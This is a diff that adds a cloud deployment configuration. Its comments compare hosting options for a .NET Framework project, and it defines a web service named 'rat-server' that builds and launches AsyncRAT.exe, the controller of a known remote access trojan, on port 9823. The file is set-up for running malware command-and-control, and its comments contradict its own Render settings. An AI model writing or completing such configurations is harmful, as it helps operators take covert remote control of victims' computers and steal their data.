@@ -1,0 +1,26 @@
+# Render Deployment Configuration
+# NOTE: Render's Docker support works best with Linux images
+# For .NET Framework 4.8 (Windows-only), you have these options:
+
+# OPTION 1: Use Render's Native .NET Support (Recommended for .NET 8)
+# Would require converting the project to .NET 8 first
+
+# OPTION 2: Use Railway.app instead (Better Windows/.NET Framework support)
+# Railway has built-in Windows VM support
+
+# OPTION 3: Use Azure App Service (Best .NET Framework Support)
+# Excellent native .NET Framework support with WebSocket capability
+
+# OPTION 4: Use Docker on Render (requires Linux image)
+# Would need to convert to .NET 6+ for Linux compatibility
+
+# For now, this deployment uses Railway.app which has native Windows support
+# See DEPLOYMENT.md for detailed instructions
+
+services:
+  - type: web
+    name: rat-server
+    runtime: dotnet
+    buildCommand: "dotnet build Server/Server.vbproj -c Release"
+    startCommand: "Server/bin/Release/AsyncRAT.exe"
+    port: 9823
